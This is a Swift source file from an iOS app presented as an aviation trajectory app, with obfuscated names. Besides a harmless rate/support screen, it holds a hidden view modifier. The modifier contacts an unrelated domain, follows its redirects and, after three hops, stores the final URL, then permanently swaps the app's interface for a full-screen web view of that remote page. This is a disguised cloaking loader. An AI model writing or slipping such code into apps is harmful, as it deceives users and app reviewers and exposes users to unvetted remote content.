//
//  SetbisvbkVi.swift
//  AviationTrajectoryLines
//
//  Created by Nicolae Chivriga on 11/02/2025.
//

import SwiftUI
import StoreKit

struct SetbisvbkVi: View {
    @Environment(\.dismiss) var dismiss
    var body: some View {
        ZStack {
            Image("dhoeopamb")
                .resizable()
                .ignoresSafeArea()
            
            Image("sofpbq")
                .resizable()
                .scaledToFit()
                .padding(34.2)
                .overlay {
                    HStack(spacing: 25) {
                        Button {
                            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                                     SKStoreReviewController.requestReview(in: windowScene)
                                 }
                        } label: {
                            Image("leipsz")
                                .resizable()
                                .scaledToFit()
                                .padding(30)
                                .overlay {
                                    Text("RATE")
                                        .font(.system(size: 25, weight: .medium, design: .rounded))
                                        .foregroundStyle(.white)
                                }
                        }
                        
                        
                        Button {
                            if let url = URL(string: "mailto:reshmikamndar929393933@gmail.com") {
                                
                                UIApplication.shared.open(url) {  succes in
                                 
                                }
                            }
                        } label: {
                            Image("leipsz")
                                .resizable()
                                .scaledToFit()
                                .padding(30)
                                .overlay {
                                    Text("SUPPORT")
                                        .font(.system(size: 25, weight: .medium, design: .rounded))
                                        .foregroundStyle(.white)
                                }
                        }

                     
                    }
                    .padding(.horizontal, 25)
                }
        }
        .navigationBarBackButtonHidden()
        .navigationBarItems(leading:
                                Button(action: {
            dismiss()
        }, label: {
            Image("boitba")
        })
    )

    }
}
import WebKit
struct Sbmhkopeas: ViewModifier {
    @State var skgie: Bool = true
    @State var webView: WKWebView = WKWebView()

    @AppStorage("adapt") var aqarkw: URL?
    
    func body(content: Content) -> some View {
        ZStack {
            
            if !skgie {
                if aqarkw != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: aqarkw!, zaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: aqarkw!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        AppDelegate.movement = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }
        .onAppear() {
            if aqarkw == nil {
                spbgroiasrtas()
            } else {
                skgie = false
            }
        }
    }

    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
           
                redirects1 += 1
                if redirects1 >= 3 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func spbgroiasrtas() {
        guard let url = URL(string: "https://optimizeprivacyonline.online/en/ntesavi") else {
            DispatchQueue.main.async {
                self.skgie = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            aqarkw = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.skgie = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
//                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.skgie = false
                }
            }

            DispatchQueue.main.async {
                self.skgie = false
            }
        }.resume()
    }


}
